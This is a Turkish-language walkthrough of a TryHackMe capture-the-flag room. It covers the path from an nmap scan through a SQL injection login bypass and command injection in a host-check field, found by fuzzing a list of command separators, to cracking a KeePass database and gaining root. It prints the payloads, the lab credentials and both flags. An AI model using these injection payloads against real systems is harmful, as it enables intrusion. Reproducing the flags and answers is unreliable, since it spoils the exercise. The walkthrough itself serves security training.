# TryHackMe — Silent Monitor

## Nmap ile Başlayalım

İlk olarak bütün TCP portlarını tarıyorum:

```bash
nmap -sS -A -p- 10.113.152.118
```

Tarama sonucunda `5050` portunda çalışan bir HTTP servisi olduğunu görüyorum.

<img width="1919" height="901" alt="site" src="https://github.com/user-attachments/assets/09a701cb-abab-4d7b-9028-4fde70b62288" />

Siteyi elle incelemeye başlamadan önce dizin taramasını da arka planda çalıştırıyorum. Böylece ben siteyi incelerken ffuf da olası endpointleri bulmaya devam etsin.

```bash
ffuf -u http://10.113.152.118:5050/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Siteyi biraz incelediğimde herhangi bir button, form veya benim işime yarayacak başka bir request göremedim. Bu yüzden uygulamada elle keşfedebileceğim fazla bir şey yok gibi duruyordu.

Bu sırada ffuf sonucu geldi:

<img width="901" height="411" alt="ffud" src="https://github.com/user-attachments/assets/3537a655-b019-4ff3-9eca-3df899827ce8" />

Direkt `/internal` dizinine geçiyorum.

---

## Internal Portal

<img width="1919" height="920" alt="internal" src="https://github.com/user-attachments/assets/13cb771c-3e3d-469d-9641-4d9cc4913e31" />

Burada herhangi bir kullanıcı adı veya parola bilgimiz yok. Normal bir parola brute force saldırısına başlamadan önce login mekanizmasının nasıl çalıştığını kontrol etmek daha mantıklı geldi.

Login formunda SQL injection denemeye karar verdim.

Username kısmına:

```text
admin' OR 1=1 -- -
```

yazıp password kısmına herhangi bir değer verdiğimde login olabildim.

<img width="1919" height="917" alt="login" src="https://github.com/user-attachments/assets/ef2512c4-ab3b-451c-a931-4f21583fabe3" />

---

## Host Health Kısmına Bakalım

Login olduktan sonra portal içerisinde `Host Health` isimli bir bölüm gördüm.

Burada `Target Hostname or IP` şeklinde bir alan vardı.

Uygulamanın aldığı değeri sunucu tarafında bir komuta gönderiyor olabileceğini düşündüm. Özellikle IP/hostname gibi bir değer alıp host health kontrolü yapan uygulamalarda `ping` gibi sistem komutlarının kullanılması oldukça olası.

İlk olarak Burp Suite üzerinden request'i yakaladım.

Örneğin request içerisinde:

```text
target=10.10.0.1
```

şeklinde bir parametre olduğunu gördüm.

<img width="1887" height="863" alt="burp1" src="https://github.com/user-attachments/assets/fdcf82b9-15dd-42c3-80f3-e6ece22b71e2" />

---
## Intruder ile Ayraçları Deneyelim

Burada direkt komut çalıştırmayı test etmek için parametrenin sonuna `;` ekleyip ikinci bir komut göndermeyi denedim:

```text
target=10.10.0.1;ls
```

Hangi karakterlerin filtreyi geçebildiğini tek tek denemek yerine Burp Intruder kullanmaya karar verdim.

Burada amacım doğrudan payload çalıştırmak değil, uygulamanın hangi command separator karakterlerini kabul ettiğini görmekti.

Kullandığım liste:

```text
;
&
&&
||
|
%0a
%0d
\n
\r
%26
%7c
%3b
%0a
%0d
```
<img width="1853" height="550" alt="intruder" src="https://github.com/user-attachments/assets/161ab971-73bc-40bd-ad1d-e4bd2f24d156" />

Request içerisindeki separator kısmını Intruder payload position olarak seçip saldırıyı başlattım.

Özellikle response length değerlerine baktım. Çünkü normal bir request ile `ls` komutunun çalıştığı request arasında response boyutunda fark oluşması bekleniyor.

Sonuçlarda `%0a` ile farklı bir response aldığımı gördüm.

Bu değeri tek başına tekrar test etmek için Repeater'a gönderip kontrol ettim.

<img width="1438" height="685" alt="intruder2" src="https://github.com/user-attachments/assets/4decc5ba-1dc5-4b1a-a6ef-cac0218bb547" />

<img width="1877" height="884" alt="burp2" src="https://github.com/user-attachments/assets/f58b95dc-919d-4fdf-aba8-0bcec6f59a8d" />

---

## Secret Config

Çıktıda `secret.config` dosyasını gördüm.

Dosyanın içeriğini okumayup credential bilgilerini aldım.

Burada `sysadmin` kullanıcısına ait bilgiler vardı:

<img width="1533" height="717" alt="secretconfig" src="https://github.com/user-attachments/assets/041ff78b-a822-4b2c-85e9-98c6d75453d8" />

```text
username: sysadmin
password: S3cur3Backup$Acc3ss!
```

Bu noktada SSH'ın Nmap taramasında açık olduğunu da hatırladım. Elimizde artık hem SSH servisi hem de geçerli bir kullanıcı bilgisi olduğu için web tarafında daha fazla uğraşmak yerine SSH üzerinden sisteme geçmek daha mantıklı.

```bash
ssh sysadmin@10.113.152.118
```

Parola olarak:

```text
S3cur3Backup$Acc3ss!
```

kullanıyorum ve sisteme giriş yapıyorum.

---

## İlk Flag

SSH üzerinden giriş yaptıktan sonra kullanıcının home dizinini kontrol ediyorum.

`user.txt` dosyasını bulup okuyorum:

```bash
cat user.txt
```
<img width="448" height="183" alt="ilkflag" src="https://github.com/user-attachments/assets/74f782e5-e297-4fed-bed9-9a10109bd1ce" />

### Flag 1

`THM{sQLi_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}`

---

## Backup Dizinine Bakalım

Aynı dizinde `backup` dizinini gördüm.

```bash
ls -la
```

Dizinin içerisinde `README.txt` bulunuyordu.

<img width="706" height="202" alt="backupreadme" src="https://github.com/user-attachments/assets/af6477af-965b-4a36-a3e5-f4900dcb72e0" />

Dosyayı okuduğumda burada `infrastructure.kdbx` isimli bir KeePass veritabanından bahsedildiğini gördüm.

Kısaca burada önemli olan nokta şu: `.kdbx` dosyası içerisinde kullanıcı adı, parola ve benzeri credential bilgileri tutulabilir. Eğer bu dosyayı kendi makineme alıp parolasını kırabilirsem daha yüksek yetkili bir hesabın bilgilerine ulaşma ihtimalim var.

---

## KeePass Veritabanını Kendi Makinemize Alalım

İlk başta dosyayı `wget` ile almaya çalıştım fakat bunun için uygun olmadığını gördüm.

Dosyayı SSH üzerinden kopyalamak için `scp` kullandım:

```bash
scp sysadmin@10.113.152.118:~/backups/infrastructure.kdbx .
```

Dosya artık kendi makinemde.

<img width="680" height="85" alt="dosyaindirdik" src="https://github.com/user-attachments/assets/8d335db2-5ad4-4405-a4b0-8c501e5d8cb0" />

---

## KDBX Parolasını Kırmak

Biraz araştırdıktan sonra KeePass veritabanı için kullanılabilecek `brutalkeepass` aracını buldum.

Repository:

`https://github.com/toneillcodes/brutalkeepass/`

Wordlist olarak rockyou kullanarak brute force denedim:

```bash
python bfkeepass.py -d ~/Desktop/infrastructure.kdbx -w /opt/wordlists/rockyou.txt -v
```

Bir süre sonra veritabanı parolasını buldu:

```text
spring
```

---

## KeePass Database'i Açalım

KDBX dosyasını incelemek için `KeePassXC` kullandım.

```bash
keepassxc
```

Program içerisinden `Open Database` seçeneğine tıkladıktan sonra:

```text
infrastructure.kdbx
```

dosyasını seçtim.

Parola olarak:

```text
spring
```

girdikten sonra database açıldı.

İçerideki kayıtları kontrol ettiğimde root hesabına ait credential bilgisini buldum:

```text
S3cur3P4ss0nK33p4ss
```

Burada artık root hesabına ait bir parola olduğunu düşündüğüm için bunu doğrudan `su` ile test ettim.

<img width="1210" height="858" alt="springafter" src="https://github.com/user-attachments/assets/f9a0f0f4-15a9-412f-8128-0bf719a24de3" />

---

## Root'a Geçiş

SSH session içerisinde:

```bash
su root
```

komutunu çalıştırdım.

Parola olarak infrastructure.kdbx dosyasından bulduğumuz:

```text
S3cur3P4ss0nK33p4ss
```

değerini girdim.

Ve root kullanıcısına geçiş başarılı oldu.

Son olarak root flag'ini okuyorum:

```bash
cat /root/root.txt
```
<img width="459" height="140" alt="sonflag" src="https://github.com/user-attachments/assets/00407dbf-b50c-4f5b-a2cf-91e5c60b768c" />

### Root Flag

`THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}`
